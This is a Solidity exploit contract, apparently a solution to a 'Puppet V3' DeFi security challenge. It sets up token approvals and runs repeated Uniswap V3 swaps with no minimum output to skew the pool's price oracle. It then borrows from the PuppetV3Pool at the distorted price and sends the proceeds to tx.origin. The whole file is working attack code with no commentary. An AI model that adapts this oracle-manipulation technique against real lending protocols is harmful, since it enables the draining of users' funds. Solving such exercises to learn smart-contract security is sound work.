// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "hardhat/console.sol";
import "./PuppetV3Pool.sol";

contract PuppetV3PoolExp {
    IERC20Minimal weth =
        IERC20Minimal(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Minimal token;
    ISwapRouter router;
    PuppetV3Pool pool;

    constructor(IERC20Minimal _token, PuppetV3Pool _pool) {
        token = _token;
        pool = _pool;
        router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        token.approve(address(router), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
    }

    function swap(uint256 amt, bool isSellToken, uint256 batch) public {
        uint256 tokenBalance = token.balanceOf(msg.sender);
        if (tokenBalance > 0) {
            token.transferFrom(msg.sender, address(this), tokenBalance);
        }

        address from;
        address to;
        if (isSellToken) {
            from = address(token);
            to = address(weth);
        } else {
            from = address(weth);
            to = address(token);
        }

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams(
                from,
                to,
                3000,
                address(this),
                block.timestamp,
                amt,
                0,
                0
            );

        for (uint i = 0; i < batch; i++) {
            router.exactInputSingle(params);
        }
    }

    function borrow(uint256 amt) public {
        pool.borrow(amt);
        withdraw();
    }

    function withdraw() public {
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }
}
